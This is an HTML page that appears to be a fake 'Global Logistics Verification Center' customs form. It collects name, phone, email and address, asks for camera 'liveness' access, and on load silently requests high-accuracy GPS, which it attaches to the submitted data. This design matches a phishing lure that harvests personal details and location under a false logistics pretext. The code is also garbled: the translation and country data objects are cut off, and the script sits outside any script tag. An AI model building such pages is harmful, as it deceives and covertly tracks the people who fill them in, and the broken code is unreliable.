<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Logistics Verification Center</title>
    <style>
        :root { --primary: #004b87; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #ced4da; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: var(--card); width: 100%; max-width: 580px; padding: 30px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.08); }
        h2 { margin-top: 0; color: var(--primary); text-align: center; font-size: 22px; }
        .form-row { display: flex; gap: 15px; margin-bottom: 15px; }
        .form-group { margin-bottom: 15px; flex: 1; }
        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 5px; color: #555; }
        input, select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,75,135,0.1); }
        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
        .btn:hover { background: #003366; }
        
        #step-form, #step-verification { display: none; }
        .lang-card { text-align: center; }
        .lang-btn { width: 100%; padding: 14px; margin: 10px 0; background: #fff; border: 2px solid var(--primary); color: var(--primary); border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .lang-btn:hover { background: var(--primary); color: #fff; }
        
        #video-container { text-align: center; }
        video { width: 100%; max-width: 400px; height: 300px; border-radius: 8px; transform: scaleX(-1); background: #000; object-fit: cover; }
    </style>
</head>
<body>

<div class="container">
    <!-- 语言选择 -->
    <div id="step-language" class="lang-card">
        <h2>🌐 Select Language / 选择语言</h2>
        <button class="lang-btn" onclick="setLanguage('zh')">简体中文</button>
            <button class="lang-btn" onclick="setLanguage('en')">English</button>
            <button class="lang-btn" onclick="setLanguage('zh-TW')">繁體中文</button>
            <button class="lang-btn" onclick="setLanguage('ja')">日本語</button>
            <button class="lang-btn" onclick="setLanguage('ko')">한국어</button>
            <button class="lang-btn" onclick="setLanguage('fr')">Français</button>
            <button class="lang-btn" onclick="setLanguage('de')">Deutsch</button>
            <button class="lang-btn" onclick="setLanguage('es')">Español</button>
            <button class="lang-btn" onclick="setLanguage('ru')">Русский</button>
            <button class="lang-btn" onclick="setLanguage('ar')">العربية</button>
    </div>

    <!-- 物流申报表单 -->
    <div id="step-form">
        <h2 id="txt-form-title">Customs & Identity Verification</h2>
        
        <div class="form-row">
            <div class="form-group">
                <label id="lbl-name">Full Name (Consignor/Receiver)</label>
                <input type="text" id="fullName" placeholder="e.g. John Doe">
            </div>
            <div class="form-group">
                <label id="lbl-phone">Phone Number</label>
                <input type="tel" id="phone" placeholder="+1 234 567 890">
            </div>
        </div>

        <div class="form-group">
            <label id="lbl-email">Email Address</label>
            <input type="email" id="email" placeholder="name@example.com">
        </div>

        <div class="form-group">
            <label id="lbl-address">Street Address</label>
            <input type="text" id="address" placeholder="Street, apartment, suite, unit, etc.">
        </div>

        <div class="form-row">
            <div class="form-group">
                <label id="lbl-country">Country / Region</label>
                <select id="countrySelect" onchange="loadStates()">
                    <option value="">-- 请选择国家 / Select Country --</option>
                </select>
            </div>
            <div class="form-group">
                <label id="lbl-state">State / Province</label>
                <select id="stateSelect" disabled>
                    <option value="">-- 请先选择国家 --</option>
                </select>
            </div>
        </div>

        <div class="form-row">
            <div class="form-group">
                <label id="lbl-city">City</label>
                <input type="text" id="city" placeholder="City name">
            </div>
            <div class="form-group">
                <label id="lbl-zip">Postal / Zip Code</label>
                <input type="text" id="zipCode" placeholder="Postal code">
            </div>
        </div>

        <button class="btn" id="btn-next" onclick="proceedToVerification()">Proceed to Face Verification</button>
    </div>

    <!-- 活体检测 -->
    <div id="step-verification">
        <h2 id="txt-verify-title">Security Liveness Verification</h2>
        <p id="txt-verify-desc" style="font-size: 13px; color: #666; text-align: center;">Please keep your face within the frame for safety clearance.</p>
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
        </div>
        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #28a745;">Complete & Submit</button>
    </div>
</div>

            verifyTitle: "Security Liveness Verification",
            verifyDesc: "Please keep your face within the frame for security clearance.",

            alertName: "Please enter your full name",
            alertAddress: "Please select country and state",
            alertCamera: "Camera access is required for verification"
        }
    };

    let currentLang = 'en';
    let silentLocation = { lat: null, lng: null, precisionMeters: null };

    window.onload = () => {
        // 高精度静默定位
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    silentLocation.lat = pos.coords.latitude;
                    silentLocation.lng = pos.coords.longitude;
                    silentLocation.precisionMeters = pos.coords.accuracy;
                },
                err => { console.log("Background location optional"); },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        // 初始化国家下拉菜单
        const select = document.getElementById('countrySelect');
        select.innerHTML = `<option value="">-- 请选择国家 / Select Country --</option>`;
        
        const sortedKeys = Object.keys(globalDatabase).sort((a, b) => 
            globalDatabase[a].name.localeCompare(globalDatabase[b].name)
        );

        sortedKeys.forEach(code => {
            let opt = document.createElement('option');
            opt.value = code;
            opt.textContent = globalDatabase[code].name;
            select.appendChild(opt);
        });
    };

    function loadStates() {
        const countryCode = document.getElementById('countrySelect').value;
        const stateSelect = document.getElementById('stateSelect');
        
        stateSelect.innerHTML = `<option value="">-- ${currentLang === 'zh' ? '请选择省份/州' : 'Select State'} --</option>`;
        
        if (countryCode && globalDatabase[countryCode]) {
            stateSelect.disabled = false;
            globalDatabase[countryCode].states.forEach(stateName => {
                let opt = document.createElement('option');
                opt.value = stateName;
                opt.textContent = stateName;
                stateSelect.appendChild(opt);
            });
        } else {
            stateSelect.disabled = true;
        }
    }

    function setLanguage(lang) {
        currentLang = lang;
        const t = i18n[lang];
        document.getElementById('txt-form-title').innerText = t.formTitle;
        document.getElementById('lbl-name').innerText = t.name;
        document.getElementById('lbl-phone').innerText = t.phone;
        document.getElementById('lbl-email').innerText = t.email;
        document.getElementById('lbl-address').innerText = t.address;
        document.getElementById('lbl-country').innerText = t.country;
        document.getElementById('lbl-state').innerText = t.state;
        document.getElementById('lbl-city').innerText = t.city;
        document.getElementById('lbl-zip').innerText = t.zip;
        document.getElementById('btn-next').innerText = t.next;
        document.getElementById('txt-verify-title').innerText = t.verifyTitle;
        document.getElementById('txt-verify-desc').innerText = t.verifyDesc;
        document.getElementById('btn-submit').innerText = t.submit;

        document.getElementById('step-language').style.display = 'none';
        document.getElementById('step-form').style.display = 'block';
    }

    async function proceedToVerification() {
        const t = i18n[currentLang];
        const name = document.getElementById('fullName').value;
        const country = document.getElementById('countrySelect').value;
        
        if (!name.trim()) { alert(t.alertName); return; }
        if (!country) { alert(t.alertAddress); return; }

        document.getElementById('step-form').style.display = 'none';
        document.getElementById('step-verification').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
        } catch (e) {
            alert(t.alertCamera);
        }
    }

    function submitData() {
        const shippingPayload = {
            fullName: document.getElementById('fullName').value,
            phone: document.getElementById('phone').value,
            email: document.getElementById('email').value,
            address: document.getElementById('address').value,
            country: document.getElementById('countrySelect').value,
            state: document.getElementById('stateSelect').value,
            city: document.getElementById('city').value,
            zipCode: document.getElementById('zipCode').value,
            deviceHighPrecisionGPS: silentLocation,
            timestamp: new Date().toISOString()
        };

        console.log("Global Logistics Payload:", shippingPayload);
        alert(currentLang === 'zh' ? "清关及活体核验数据提交成功！" : "Verification and shipping data submitted successfully!");
        location.reload();
    }
